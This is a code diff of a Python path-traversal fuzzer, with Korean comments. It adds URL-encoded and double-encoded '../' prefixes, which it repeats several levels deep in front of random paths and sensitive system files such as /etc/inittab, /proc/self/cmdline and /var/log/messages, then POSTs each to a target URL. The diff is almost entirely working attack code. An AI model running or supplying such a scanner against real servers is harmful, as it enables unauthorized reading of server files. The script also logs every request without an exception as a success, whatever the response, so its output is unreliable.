@@ -11,20 +11,25 @@ from itertools import permutations
 #dictionary 값을 기반으로 random input host 주소 뒤에 날려서
 #만약 권한 없이 들어가지는 값이 있으면 저장해서 마지막에 출력
 
+prefix = ["../","..%255c","%2e%2e%2f","%2e%2e/","..%2f","%2e%2e%5c","%2e%2e\\","..%5c","%252e%252e%255c"]
+
 def random_path(url):
     print(">>>>random_path fuzzing start")
     alphabets = ['a','b','c','d','e','f','g','h','i','j','k','l','m','n',
             'o','p','q','r','s','t','u','v','w','x','y','z']
     random_success = []
     nn = 2 #length
+    depth = 3
     path_permutation= list(permutations(alphabets,nn))
     paths = []
     for i in path_permutation:
         paths.append("".join(i))
     for path in paths:
         try:
-            res = req.post(url+path)  
-            random_success.append(path)
+            for i in range(len(prefix)):
+                for j in range(0,depth+1):
+                    res = req.post(url+prefix[i]*j+path)
+                    random_success.append(path)
         except:
             print(path,": fail")
 
@@ -42,7 +47,6 @@ def existed_path(url):
                 "/etc/httpd/conf.d/vhost.conf",
                 "/etc/httpd/conf/httpd.conf",
                 "/etc/inetd.conf",
-                "/etc/init.d/rcS",
                 "/etc/inittab",
                 "/etc/issue",
                 "/etc/motd",
@@ -65,19 +69,18 @@ def existed_path(url):
                 "/proc/net/udp",
                 "/proc/sched_debug",
                 "/proc/self/cmdline",
-                "/proc/self/environ",
                 "/proc/version",
-                "/var/cache/locate/locatedb",
-                "/var/lib/mlocate/mlocate.db",
-                "/var/log/dmesg",
                 "/var/log/messages",
                 "/var/log/system.log",
                 "/var/www/html/index.html"] #추가 필요
+    depth = 3 #임의로 지정
     existed_success = []
     for path in file_list:
         try:
-            res = req.post(url+path)
-            existed_success.append(path)
+            for i in range(len(prefix)):
+                for j in range(0,depth+1):
+                    res = req.post(url+prefix[i]*j+path) #payload의 prefix 지정
+                    existed_success.append(path)
         except:
             print(path,": fail")
     return existed_success
@@ -98,3 +101,6 @@ if __name__ == "__main__":
     
     random_success = random_path(url)
     existed_success = existed_path(url)
+    print("Random Success: ",random_success)
+    print("Existed Success: ", existed_success)
+
